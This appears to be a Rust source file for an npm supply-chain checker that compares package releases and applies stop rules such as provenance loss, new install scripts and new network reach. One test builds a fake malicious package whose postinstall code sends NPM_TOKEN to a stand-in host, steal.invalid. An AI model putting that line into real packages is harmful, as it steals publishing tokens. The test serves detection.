use crate::archive::{LoadedArchive, extract_manifest_facts};
use crate::canonical::{canonical_id, parse_rfc3339_unix, transition_subject};
use crate::history::{HistoryContext, evaluate_history};
use crate::model::{
    Anchor, ArtifactProfile, BreakKind, Decision, FileRole, LedgerEndpoint, LockAlarm,
    NewDirectPolicy, OriginClass, PolicyConfig, ReadPassPolicy, ReadingOutcome, ReferenceStanding,
    ReleaseAgeBand, StopRule, TOOL_VERSION, TransitionLedger, Verdict,
};
use crate::reach::{compute_reach_delta, detect_minified_new, scan_artifact_reach};
use crate::source::{SourceSnapshot, classify_files};
use std::collections::BTreeSet;

/// Builds a project-independent `ArtifactProfile` for one verified tarball.
pub fn build_artifact_profile(
    ecosystem: &str,
    name: &str,
    version: &str,
    archive: &LoadedArchive,
    anchor: Anchor,
    source: Option<&SourceSnapshot>,
) -> ArtifactProfile {
    let manifest = extract_manifest_facts(archive);
    let reach = scan_artifact_reach(archive, &manifest);
    let (files, _, _) = classify_files(archive, None, source);

    ArtifactProfile {
        kind: "artifact_profile".to_string(),
        schema: 1,
        ecosystem: ecosystem.to_string(),
        name: name.to_string(),
        version: version.to_string(),
        sha512: archive.inventory.sha512.clone(),
        compressed_bytes: archive.inventory.compressed_bytes,
        expanded_bytes: archive.inventory.expanded_bytes,
        file_count: archive.inventory.entries.len() as u64,
        archive_facts: archive.inventory.facts.clone(),
        anchor,
        manifest,
        reach: reach.tokens,
        hostnames: reach.hostnames,
        files,
        tool_version: TOOL_VERSION.to_string(),
    }
}

pub struct TransitionInput<'a> {
    pub ecosystem: &'a str,
    pub name: &'a str,
    pub reference_archive: Option<&'a LoadedArchive>,
    pub reference_profile: Option<&'a ArtifactProfile>,
    pub reference_standing: ReferenceStanding,
    pub reference_published_at: Option<String>,
    pub new_archive: &'a LoadedArchive,
    pub new_profile: &'a ArtifactProfile,
    pub new_source: Option<&'a SourceSnapshot>,
    pub new_published_at: Option<String>,
    pub lock_alarms: BTreeSet<LockAlarm>,
    pub history_ctx: HistoryContext,
    pub history_slice_sha256: Option<String>,
}

/// Builds a timeless deterministic `TransitionLedger` (no wall-clock timestamps, no full mutable packument hash).
pub fn build_transition_ledger(
    input: TransitionInput<'_>,
) -> Result<(TransitionLedger, String), String> {
    let new_profile_id = canonical_id(input.new_profile)?;
    let ref_endpoint = match (input.reference_profile, input.reference_archive) {
        (Some(rp), Some(_)) => Some(LedgerEndpoint {
            version: rp.version.clone(),
            sha512: rp.sha512.clone(),
            profile_id: canonical_id(rp)?,
            standing: Some(input.reference_standing),
            published_at: input.reference_published_at.clone(),
        }),
        _ => None,
    };

    let subject = transition_subject(
        input.ecosystem,
        input.name,
        ref_endpoint.as_ref().map(|r| r.sha512.as_str()),
        &input.new_profile.sha512,
    );

    let (files, removed_files, totals) = classify_files(
        input.new_archive,
        input.reference_archive,
        input.new_source,
    );

    let mut non_carried_paths = BTreeSet::new();
    let mut unexplained_paths = BTreeSet::new();
    let mut unexplained_code_bytes = 0u64;
    let mut unexplained_non_exec_bytes = 0u64;

    let mut declared_exec_rel_paths: BTreeSet<String> = BTreeSet::new();
    for p in input
        .new_profile
        .manifest
        .bin_paths
        .iter()
        .chain(input.new_profile.manifest.entry_paths.iter())
    {
        declared_exec_rel_paths.insert(p.trim_start_matches("./").to_ascii_lowercase());
    }

    for f in &files {
        if f.class != OriginClass::Carried {
            non_carried_paths.insert(f.path.clone());
        }
        if f.class == OriginClass::Unexplained {
            unexplained_paths.insert(f.path.clone());
            let rel_lower = crate::archive::strip_archive_root(&f.path).to_ascii_lowercase();
            let is_declared_exec = declared_exec_rel_paths.contains(&rel_lower);
            if !is_declared_exec
                && matches!(f.role, FileRole::Declaration | FileRole::SourceMap | FileRole::Doc)
            {
                unexplained_non_exec_bytes += f.bytes;
            } else {
                unexplained_code_bytes += f.bytes;
            }
        }
    }

    let new_reach_full = scan_artifact_reach(input.new_archive, &input.new_profile.manifest);
    let ref_reach_full = match (input.reference_archive, input.reference_profile) {
        (Some(ra), Some(rp)) => Some(scan_artifact_reach(ra, &rp.manifest)),
        _ => None,
    };

    let mut reach_delta = compute_reach_delta(
        &new_reach_full,
        ref_reach_full.as_ref(),
        &non_carried_paths,
        &unexplained_paths,
    );

    if let (Some(ra), Some(rr)) = (input.reference_archive, ref_reach_full.as_ref()) {
        let ref_paths: BTreeSet<String> = ra
            .inventory
            .entries
            .iter()
            .map(|e| e.path.clone())
            .collect();
        detect_minified_new(
            &new_reach_full,
            rr,
            &ref_paths,
            &non_carried_paths,
            &unexplained_paths,
            &mut reach_delta,
        );
    }

    let history = evaluate_history(
        &input.history_ctx,
        &input.new_profile.anchor,
        &input.new_profile.manifest,
        &files,
        input.reference_profile,
    );

    let mut archive_facts = input.new_archive.inventory.facts.clone();
    if let Some(ra) = input.reference_archive {
        archive_facts.extend(ra.inventory.facts.iter().copied());
    }

    let ledger = TransitionLedger {
        kind: "ledger".to_string(),
        schema: 2,
        subject,
        ecosystem: input.ecosystem.to_string(),
        name: input.name.to_string(),
        reference: ref_endpoint,
        new: LedgerEndpoint {
            version: input.new_profile.version.clone(),
            sha512: input.new_profile.sha512.clone(),
            profile_id: new_profile_id,
            standing: None,
            published_at: input.new_published_at,
        },
        anchor: input.new_profile.anchor.clone(),
        lock_alarms: input.lock_alarms,
        archive_facts,
        files,
        removed_files,
        totals,
        unexplained_code_bytes,
        unexplained_non_exec_bytes,
        breaks: history.breaks,
        flags: history.flags,
        break_notes: history.notes,
        advisory_ids: input.history_ctx.known_malicious_ids,
        osv_unavailable: input.history_ctx.osv_unavailable,
        new_reach: reach_delta.new_reach,
        new_reach_in_unexplained: reach_delta.new_reach_in_unexplained,
        new_reach_files: reach_delta.new_reach_files,
        new_hostnames: reach_delta.new_hostnames,
        prior_release_count: input.history_ctx.total_prior_releases,
        package_first_published_at: input.history_ctx.package_first_published_at,
        history_slice_sha256: input.history_slice_sha256,
        tool_version: TOOL_VERSION.to_string(),
    };

    let ledger_id = canonical_id(&ledger)?;
    Ok((ledger, ledger_id))
}

/// Evaluates policy stop rules `S1`–`S10` on a timeless `TransitionLedger` at explicit `as_of`.
/// Produces concrete `stop_facts` (for granular S10 approval staleness) and plain-English `stop_reasons`.
pub fn evaluate_decision(
    ledger: &TransitionLedger,
    ledger_id: &str,
    policy: &PolicyConfig,
    as_of: &str,
    is_new_direct_dependency: bool,
    reading_outcome: ReadingOutcome,
    prior_approved_facts: Option<&BTreeSet<String>>,
) -> Decision {
    let as_of_unix = parse_rfc3339_unix(as_of);
    let published_age_hours = match (
        ledger.new.published_at.as_deref().and_then(parse_rfc3339_unix),
        as_of_unix,
    ) {
        (Some(pub_u), Some(now_u)) => Some((now_u - pub_u) / 3600),
        _ => None,
    };

    let package_age_days = match (
        ledger
            .package_first_published_at
            .as_deref()
            .and_then(parse_rfc3339_unix),
        as_of_unix,
    ) {
        (Some(first_u), Some(now_u)) => Some((now_u - first_u) / 86_400),
        _ => None,
    };

    let has_known_malicious = ledger.breaks.contains(&BreakKind::KnownMalicious);
    let age_band = match published_age_hours {
        Some(h) if h < policy.min_age_hours => ReleaseAgeBand::Fresh,
        Some(h) if h >= policy.settled_age_days * 24 && !has_known_malicious => {
            ReleaseAgeBand::Settled
        }
        Some(_) => ReleaseAgeBand::Recent,
        None => ReleaseAgeBand::Unknown,
    };

    let mut stop_rules = BTreeSet::new();
    let mut stop_facts = BTreeSet::new();
    let mut stop_reasons = Vec::new();

    // S1: Missing SHA-512 integrity
    if ledger.lock_alarms.contains(&LockAlarm::IntegrityMissing) {
        stop_rules.insert(StopRule::S1);
        stop_facts.insert(LockAlarm::IntegrityMissing.fact_key().to_string());
        stop_reasons.push(LockAlarm::IntegrityMissing.human_label().to_string());
    }

    // S2: Other lock alarms
    for alarm in ledger
        .lock_alarms
        .iter()
        .filter(|&&a| a != LockAlarm::IntegrityMissing)
    {
        stop_rules.insert(StopRule::S2);
        stop_facts.insert(alarm.fact_key().to_string());
        stop_reasons.push(alarm.human_label().to_string());
    }

    // S3: Archive anomalies
    for fact in &ledger.archive_facts {
        stop_rules.insert(StopRule::S3);
        stop_facts.insert(fact.fact_key().to_string());
        stop_reasons.push(fact.human_label().to_string());
    }

    // S4: Stop-severity breaks (each recorded as a distinct concrete fact, including specific OSV advisory IDs!)
    for b in &ledger.breaks {
        stop_rules.insert(StopRule::S4);
        if *b == BreakKind::KnownMalicious && !ledger.advisory_ids.is_empty() {
            for adv in &ledger.advisory_ids {
                stop_facts.insert(format!("advisory:{adv}"));
            }
        } else {
            stop_facts.insert(b.fact_key().to_string());
        }
        let note = ledger
            .break_notes
            .get(b)
            .map(|s| format!(" ({s})"))
            .unwrap_or_default();
        stop_reasons.push(format!("{}{note}", b.human_label()));
    }

    // S5: New direct dependency policy (default: ThinHistory -> stops only on young/sparse packages!)
    if is_new_direct_dependency {
        match policy.new_direct_dependency {
            NewDirectPolicy::Confirm => {
                stop_rules.insert(StopRule::S5);
                stop_facts.insert("direct:confirm".to_string());
                stop_reasons.push("new direct dependency requires human confirmation".to_string());
            }
            NewDirectPolicy::ThinHistory => {
                let is_young = package_age_days.map(|d| d < 30).unwrap_or(true);
                let few_releases = ledger.prior_release_count < 3;
                if is_young || few_releases {
                    stop_rules.insert(StopRule::S5);
                    stop_facts.insert("direct:thin_history".to_string());
                    let age_note = package_age_days
                        .map(|d| format!("{d}d old"))
                        .unwrap_or_else(|| "unknown age".to_string());
                    stop_reasons.push(format!(
                        "new direct dependency has thin publishing history ({age_note}, {} prior release(s))",
                        ledger.prior_release_count
                    ));
                }
            }
            NewDirectPolicy::Check => {}
        }
    }

    // S6: Unexplained executable/manifest bytes with no anchor (unless settled)
    let has_unexplained_code = ledger.unexplained_code_bytes > 0;
    if has_unexplained_code && !ledger.anchor.found && age_band != ReleaseAgeBand::Settled {
        stop_rules.insert(StopRule::S6);
        stop_facts.insert("unanchored:unexplained_code".to_string());
        if let Some(ref err) = ledger.anchor.lookup_error {
            stop_reasons.push(format!(
                "unexplained code bytes and source repository lookup failed ({err})"
            ));
        } else {
            stop_reasons.push("unexplained code bytes with no verified source anchor".to_string());
        }
    }

    // S7: New high-risk reach token, or any new reach token inside unexplained bytes
    let new_high_reach: Vec<_> = ledger.new_reach.iter().filter(|t| t.is_high()).copied().collect();
    for tok in &new_high_reach {
        stop_rules.insert(StopRule::S7);
        stop_facts.insert(format!("reach_high:{}", tok.key()));
        stop_reasons.push(format!("new high-risk capability: {}", tok.human_label()));
    }
    for tok in &ledger.new_reach_in_unexplained {
        if !tok.is_high() {
            stop_rules.insert(StopRule::S7);
            stop_facts.insert(format!("reach_unexplained:{}", tok.key()));
            stop_reasons.push(format!(
                "new capability inside unexplained bytes: {}",
                tok.human_label()
            ));
        }
    }

    // Reading is required ONLY when unexplained executable/manifest bytes, flags, or new reach exist.
    // Pure non-executable doc/declaration/sourcemap differences never cause a fake S8 stop!
    let reading_required =
        has_unexplained_code || !ledger.flags.is_empty() || !ledger.new_reach.is_empty();

    // S8: Reading required and did not pass
    if reading_required && reading_outcome != ReadingOutcome::Passed {
        stop_rules.insert(StopRule::S8);
        stop_facts.insert(format!("reading:{reading_outcome:?}").to_ascii_lowercase());
        let msg = match reading_outcome {
            ReadingOutcome::NotRun => {
                "unexplained code or flags remain (inspect the inline diff below, or re-run with --read)"
            }
            ReadingOutcome::Concern => "reader flagged suspicious or concerning code",
            ReadingOutcome::Invalid => "reader output failed validation (ungrounded citation or schema error)",
            ReadingOutcome::Unread => "unexplained diff exceeded reader hard cap or contains binary data",
            ReadingOutcome::Refused => "reader model refused to review content",
            ReadingOutcome::Unavailable => "reader unavailable (check ANTHROPIC_API_KEY or reader.command)",
            ReadingOutcome::NotRequired | ReadingOutcome::Passed => "reading did not pass",
        };
        stop_reasons.push(msg.to_string());
    }

    // S9: Fresh release (< min_age) and not deterministically explained
    if age_band == ReleaseAgeBand::Fresh && reading_required {
        stop_rules.insert(StopRule::S9);
        stop_facts.insert("age:fresh_unexplained".to_string());
        stop_reasons.push(format!(
            "release is less than {}h old ({}h) and not fully explained by source",
            policy.min_age_hours,
            published_age_hours.unwrap_or(0)
        ));
    }

    // Policy gate: require human review after a passed reading when configured (`read_pass = "require_human"`).
    // Recorded in `stop_facts` BEFORE S10 so prior approvals for weaker facts cannot bypass it!
    if reading_required
        && reading_outcome == ReadingOutcome::Passed
        && policy.read_pass == ReadPassPolicy::RequireHuman
    {
        stop_facts.insert("policy:read_pass_require_human".to_string());
        stop_reasons.push(
            "policy requires explicit human approval even after reading passed (read_pass = require_human)".to_string(),
        );
    }

    // S10: Granular staleness check — ANY concrete stop fact absent from `prior_approved_facts` invalidates the approval!
    if let Some(approved) = prior_approved_facts {
        let new_facts: Vec<&String> = stop_facts.difference(approved).collect();
        if !new_facts.is_empty() {
            stop_rules.insert(StopRule::S10);
            let joined = new_facts
                .iter()
                .map(|s| s.as_str())
                .collect::<Vec<_>>()
                .join(", ");
            stop_reasons.push(format!(
                "prior approval is stale: new stop facts appeared ({joined})"
            ));
        }
    }

    let verdict = if !stop_rules.is_empty() {
        Verdict::Stop
    } else if !reading_required {
        Verdict::Explained
    } else if policy.read_pass == ReadPassPolicy::RequireHuman {
        Verdict::Stop
    } else {
        Verdict::Read
    };

    Decision {
        kind: "decision".to_string(),
        schema: 2,
        ledger_id: ledger_id.to_string(),
        subject: ledger.subject.clone(),
        as_of: as_of.to_string(),
        policy_version: policy.policy_version,
        published_age_hours,
        age_band,
        reading_required,
        reading_outcome: if reading_required {
            reading_outcome
        } else {
            ReadingOutcome::NotRequired
        },
        stop_rules,
        stop_facts,
        stop_reasons,
        verdict,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::archive::inspect_tgz;
    use crate::history::ReleaseMetaSummary;
    use crate::model::{AnchorMethod, ArchiveLimits, BreakKind, ReachToken};
    use flate2::Compression;
    use flate2::write::GzEncoder;
    use std::collections::BTreeMap;
    use std::io::Write;

    fn make_tgz(files: &[(&str, &[u8])]) -> Vec<u8> {
        let mut tar = Vec::new();
        for (name, data) in files {
            let mut hdr = [0u8; 512];
            let nb = name.as_bytes();
            hdr[..nb.len()].copy_from_slice(nb);
            hdr[100..108].copy_from_slice(b"0000644\0");
            hdr[108..116].copy_from_slice(b"0000000\0");
            hdr[116..124].copy_from_slice(b"0000000\0");
            let size_oct = format!("{:011o}\0", data.len());
            hdr[124..136].copy_from_slice(size_oct.as_bytes());
            hdr[136..148].copy_from_slice(b"00000000000\0");
            hdr[148..156].copy_from_slice(b"        ");
            hdr[156] = b'0';
            hdr[257..263].copy_from_slice(b"ustar\0");
            hdr[263..265].copy_from_slice(b"00");
            let csum: u32 = hdr.iter().map(|&b| b as u32).sum();
            let csum_oct = format!("{csum:06o}\0 ");
            hdr[148..156].copy_from_slice(csum_oct.as_bytes());
            tar.extend_from_slice(&hdr);
            tar.extend_from_slice(data);
            let pad = (512 - (data.len() % 512)) % 512;
            tar.extend(std::iter::repeat_n(0u8, pad));
        }
        tar.extend(std::iter::repeat_n(0u8, 1024));
        let mut enc = GzEncoder::new(Vec::new(), Compression::default());
        enc.write_all(&tar).unwrap();
        enc.finish().unwrap()
    }

    fn anchored(commit: &str) -> Anchor {
        Anchor {
            found: true,
            commit: Some(commit.to_string()),
            method: Some(AnchorMethod::ProvenanceAsserted),
            methods_tried: vec!["provenance".into()],
            conflict: false,
            conflict_details: Vec::new(),
            repository_url: Some("https://github.com/org/pkg".into()),
            repository_directory: None,
            workflow_path: None,
            workflow_ref: None,
            reachable_from_branch: Some(true),
            lookup_error: None,
        }
    }

    fn unanchored() -> Anchor {
        Anchor {
            found: false,
            commit: None,
            method: None,
            methods_tried: vec!["provenance".into(), "gitHead".into(), "tag".into()],
            conflict: false,
            conflict_details: Vec::new(),
            repository_url: Some("https://github.com/org/pkg".into()),
            repository_directory: None,
            workflow_path: None,
            workflow_ref: None,
            reachable_from_branch: None,
            lookup_error: None,
        }
    }

    #[test]
    fn timeless_ledger_separates_fresh_and_recent_decisions() {
        let ref_tgz = make_tgz(&[
            ("package/package.json", br#"{"name":"demo","version":"1.0.0"}"#),
            ("package/dist.js", b"export const a = 1;\n"),
        ]);
        let new_tgz = make_tgz(&[
            ("package/package.json", br#"{"name":"demo","version":"1.0.1"}"#),
            ("package/dist.js", b"export const a = 2;\n"),
        ]);
        let ref_arch = inspect_tgz(&ref_tgz, None, ArchiveLimits::default()).unwrap();
        let new_arch = inspect_tgz(&new_tgz, None, ArchiveLimits::default()).unwrap();

        let ref_prof = build_artifact_profile("npm", "demo", "1.0.0", &ref_arch, anchored("aaa"), None);
        let new_prof = build_artifact_profile("npm", "demo", "1.0.1", &new_arch, anchored("bbb"), None);

        let (ledger, ledger_id) = build_transition_ledger(TransitionInput {
            ecosystem: "npm",
            name: "demo",
            reference_archive: Some(&ref_arch),
            reference_profile: Some(&ref_prof),
            reference_standing: ReferenceStanding::Admitted,
            reference_published_at: Some("2026-10-01T00:00:00Z".into()),
            new_archive: &new_arch,
            new_profile: &new_prof,
            new_source: None,
            new_published_at: Some("2026-11-19T20:00:00Z".into()),
            lock_alarms: BTreeSet::new(),
            history_ctx: HistoryContext {
                prior_releases: vec![],
                total_prior_releases: 10,
                package_first_published_at: Some("2022-01-01T00:00:00Z".into()),
                new_release: ReleaseMetaSummary {
                    version: "1.0.1".into(),
                    published_at: Some("2026-11-19T20:00:00Z".into()),
                    ..Default::default()
                },
                reference_had_anchor: Some(true),
                ..Default::default()
            },
            history_slice_sha256: Some("deadbeef".into()),
        })
        .unwrap();

        let policy = PolicyConfig::default();
        let fresh = evaluate_decision(
            &ledger,
            &ledger_id,
            &policy,
            "2026-11-19T23:00:00Z",
            false,
            ReadingOutcome::Passed,
            None,
        );
        assert_eq!(fresh.verdict, Verdict::Stop);
        assert!(fresh.stop_rules.contains(&StopRule::S9));

        let recent = evaluate_decision(
            &ledger,
            &ledger_id,
            &policy,
            "2026-11-21T02:00:00Z",
            false,
            ReadingOutcome::Passed,
            None,
        );
        assert_eq!(recent.verdict, Verdict::Read);
        assert!(recent.stop_rules.is_empty());
        assert_eq!(fresh.ledger_id, recent.ledger_id);
    }

    #[test]
    fn granular_s10_invalidates_s4_approval_when_new_malicious_advisory_arrives() {
        let tgz = make_tgz(&[
            ("package/package.json", br#"{"name":"demo","version":"1.0.1"}"#),
            ("package/index.js", b"export const ok = true;\n"),
        ]);
        let arch = inspect_tgz(&tgz, None, ArchiveLimits::default()).unwrap();
        let mut tree = BTreeMap::new();
        let mut blobs = BTreeMap::new();
        for (p, b) in &arch.contents {
            let rel = p.strip_prefix("package/").unwrap().to_string();
            let sha1 = crate::digest::git_blob_sha1_hex(b);
            tree.insert(rel, sha1.clone());
            blobs.insert(sha1, b.clone());
        }
        let src = SourceSnapshot {
            tree_blob_sha1: tree,
            blobs_by_sha1: blobs,
            package_dir: None,
        };
        let prof = build_artifact_profile("npm", "demo", "1.0.1", &arch, anchored("bbb"), Some(&src));

        // Later, a MAL advisory arrives on top of provenance_lost (both are S4!)
        let (ledger, ledger_id) = build_transition_ledger(TransitionInput {
            ecosystem: "npm",
            name: "demo",
            reference_archive: None,
            reference_profile: None,
            reference_standing: ReferenceStanding::None,
            reference_published_at: None,
            new_archive: &arch,
            new_profile: &prof,
            new_source: Some(&src),
            new_published_at: Some("2026-10-01T00:00:00Z".into()),
            lock_alarms: BTreeSet::new(),
            history_ctx: HistoryContext {
                prior_releases: vec![ReleaseMetaSummary {
                    version: "1.0.0".into(),
                    has_provenance: true,
                    ..Default::default()
                }],
                total_prior_releases: 5,
                package_first_published_at: Some("2024-01-01T00:00:00Z".into()),
                new_release: ReleaseMetaSummary {
                    version: "1.0.1".into(),
                    has_provenance: false,
                    ..Default::default()
                },
                known_malicious_ids: vec!["MAL-2026-9999".into()],
                ..Default::default()
            },
            history_slice_sha256: Some("abc".into()),
        })
        .unwrap();

        // Human previously approved ONLY `break:provenance_lost` (which was S4).
        let approved = BTreeSet::from(["break:provenance_lost".to_string()]);
        let dec = evaluate_decision(
            &ledger,
            &ledger_id,
            &PolicyConfig::default(),
            "2026-11-19T23:00:00Z",
            false,
            ReadingOutcome::NotRun,
            Some(&approved),
        );
        assert!(dec.stop_facts.contains("advisory:MAL-2026-9999"));
        assert!(dec.stop_rules.contains(&StopRule::S10));
    }

    #[test]
    fn stolen_token_style_release_stops_deterministically() {
        let ref_pkg = br#"{"name":"demo","version":"1.0.0","repository":"org/pkg"}"#;
        let ref_js = b"export const ok = true;\n";
        let ref_tgz = make_tgz(&[
            ("package/package.json", ref_pkg),
            ("package/index.js", ref_js),
        ]);
        let evil_pkg = br#"{"name":"demo","version":"1.0.1","repository":"org/pkg","scripts":{"postinstall":"node index.js"}}"#;
        let evil_js = b"const cp = require('child_process'); fetch('https://steal.invalid/' + process.env.NPM_TOKEN);\n";
        let new_tgz = make_tgz(&[
            ("package/package.json", evil_pkg),
            ("package/index.js", evil_js),
        ]);

        let ref_arch = inspect_tgz(&ref_tgz, None, ArchiveLimits::default()).unwrap();
        let new_arch = inspect_tgz(&new_tgz, None, ArchiveLimits::default()).unwrap();

        let mut tree = BTreeMap::new();
        let mut blobs = BTreeMap::new();
        let pkg_sha1 = crate::digest::git_blob_sha1_hex(ref_pkg);
        let js_sha1 = crate::digest::git_blob_sha1_hex(ref_js);
        tree.insert("package.json".into(), pkg_sha1.clone());
        tree.insert("index.js".into(), js_sha1.clone());
        blobs.insert(pkg_sha1, ref_pkg.to_vec());
        blobs.insert(js_sha1, ref_js.to_vec());
        let ref_src = SourceSnapshot {
            tree_blob_sha1: tree,
            blobs_by_sha1: blobs,
            package_dir: None,
        };

        let ref_prof = build_artifact_profile("npm", "demo", "1.0.0", &ref_arch, anchored("aaa"), Some(&ref_src));
        let new_prof = build_artifact_profile("npm", "demo", "1.0.1", &new_arch, unanchored(), None);

        let (ledger, ledger_id) = build_transition_ledger(TransitionInput {
            ecosystem: "npm",
            name: "demo",
            reference_archive: Some(&ref_arch),
            reference_profile: Some(&ref_prof),
            reference_standing: ReferenceStanding::Admitted,
            reference_published_at: Some("2026-10-01T00:00:00Z".into()),
            new_archive: &new_arch,
            new_profile: &new_prof,
            new_source: None,
            new_published_at: Some("2026-11-19T20:00:00Z".into()),
            lock_alarms: BTreeSet::new(),
            history_ctx: HistoryContext {
                prior_releases: vec![ReleaseMetaSummary {
                    version: "1.0.0".into(),
                    has_provenance: true,
                    has_git_head: true,
                    repository_url: Some("https://github.com/org/pkg".into()),
                    ..Default::default()
                }],
                total_prior_releases: 1,
                package_first_published_at: Some("2026-10-01T00:00:00Z".into()),
                new_release: ReleaseMetaSummary {
                    version: "1.0.1".into(),
                    has_provenance: false,
                    ..Default::default()
                },
                reference_had_anchor: Some(true),
                ..Default::default()
            },
            history_slice_sha256: Some("abc".into()),
        })
        .unwrap();

        assert!(ledger.breaks.contains(&BreakKind::AnchorLost));
        assert!(ledger.breaks.contains(&BreakKind::ProvenanceLost));
        assert!(ledger.breaks.contains(&BreakKind::SourceMatchDrop));
        assert!(ledger.breaks.contains(&BreakKind::InstallScriptNew));
        assert!(ledger.new_reach.contains(&ReachToken::Proc));
        assert!(ledger.new_reach.contains(&ReachToken::Net));
        assert!(ledger.new_reach.contains(&ReachToken::Env));
        assert!(ledger.new_hostnames.contains("steal.invalid"));

        let dec = evaluate_decision(
            &ledger,
            &ledger_id,
            &PolicyConfig::default(),
            "2026-11-22T00:00:00Z",
            false,
            ReadingOutcome::NotRun,
            None,
        );
        assert_eq!(dec.verdict, Verdict::Stop);
        assert!(dec.stop_rules.contains(&StopRule::S4));
        assert!(dec.stop_rules.contains(&StopRule::S6));
        assert!(dec.stop_rules.contains(&StopRule::S7));
    }
}
